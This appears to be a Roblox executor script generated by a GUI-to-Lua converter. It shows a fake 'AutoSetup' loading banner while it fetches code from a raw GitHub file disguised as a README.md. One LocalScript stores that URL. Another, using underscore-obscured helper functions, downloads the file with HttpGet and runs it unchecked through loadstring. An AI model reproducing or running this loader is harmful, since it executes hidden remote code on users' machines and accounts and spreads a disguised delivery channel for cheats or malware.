--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 5 | Scripts: 2 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.AutoSetup
G2L["1"] = Instance.new("ScreenGui", game.CoreGui);
G2L["1"]["Enabled"] = false;
G2L["1"]["Name"] = [[AutoSetup]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;


-- StarterGui.AutoSetup.Loading
G2L["2"] = Instance.new("ScreenGui", G2L["1"]);
G2L["2"]["DisplayOrder"] = 2147483646;
G2L["2"]["Name"] = [[Loading]];
G2L["2"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["2"]["ResetOnSpawn"] = false;


-- StarterGui.AutoSetup.Loading.TextLabel
G2L["3"] = Instance.new("TextLabel", G2L["2"]);
G2L["3"]["TextWrapped"] = true;
G2L["3"]["BorderSizePixel"] = 0;
G2L["3"]["TextSize"] = 14;
G2L["3"]["TextScaled"] = true;
G2L["3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3"]["BackgroundTransparency"] = 0.5;
G2L["3"]["Size"] = UDim2.new(1, 0, 0, 30);
G2L["3"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["3"]["Text"] = [[Loading ExSer: Connecting to Server]];
G2L["3"]["Position"] = UDim2.new(0, 0, 1.16, -30);


-- StarterGui.AutoSetup.LocalScript
G2L["4"] = Instance.new("LocalScript", G2L["1"]);



-- StarterGui.AutoSetup.LocalScript
G2L["5"] = Instance.new("LocalScript", G2L["1"]);



-- StarterGui.AutoSetup.LocalScript
local function C_4()
local script = G2L["4"];
	script.Parent.Loading.TextLabel:TweenPosition(
		UDim2.new(0, 0,1, -30),
		Enum.EasingDirection.Out,
		Enum.EasingStyle.Bounce,
		2,
		true
	)
	
	local function _(_3)
		return loadstring(game:HttpGet(_3))
	end
	
	local function _________(_8)
		script.Parent.Loading.TextLabel.Text = _8
	end
	
	local function ____(__43)
		script.Parent.Loading.TextLabel.Text = __43
	end
	
	local function __Connect__(__21)
		local URL = _G.MainModule
		_________("Script Made by OutMoon !!! pls follow us on scriptblox = OutMoonBkToTroll")
		wait(7 or 10)
		_________("Checking if HttpService enable ! ")
		wait(5)
	
		if game.HttpService.HttpEnabled then
			____("Connected To API Pls Wait Until Script Being SetUp")
	
			local success, err = pcall(function()
				_(URL)()
			end)
	
			if success then
				____("SetUp Finished")
				wait(2)
				_________("Closing !!!")
				wait(3)
				script.Parent.Loading.TextLabel:TweenPosition(
					UDim2.new(0, 0, 1.16, -30),
					Enum.EasingDirection.Out,
					Enum.EasingStyle.Bounce,
					0.5,
					true
				)
			else
				____("SetUp Failed: " .. tostring(err))
				wait(2)
				_________("Closing !!!")
				wait(3)
				script.Parent.Loading.TextLabel:TweenPosition(
					UDim2.new(0, 0, 1.16, -30),
					Enum.EasingDirection.Out,
					Enum.EasingStyle.Bounce,
					0.5,
					true
				)
			end
	
		else
			_________("Getting Http Failed !")
			wait(2)
			_________("Closing !!!")
			wait(3)
			script.Parent.Loading.TextLabel:TweenPosition(
				UDim2.new(0, 0, 1.16, -30),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Bounce,
				0.5,
				true
			)
		end
	end
	
	return __Connect__()
	
end;
task.spawn(C_4);
-- StarterGui.AutoSetup.LocalScript
local function C_5()
local script = G2L["5"];
	local urlok = "https://raw.githubusercontent.com/G4mg1/wow-how-did-you-find-it/refs/heads/main/README.md"
	_G.MainModule = urlok 
end;
task.spawn(C_5);

return G2L["1"], require;
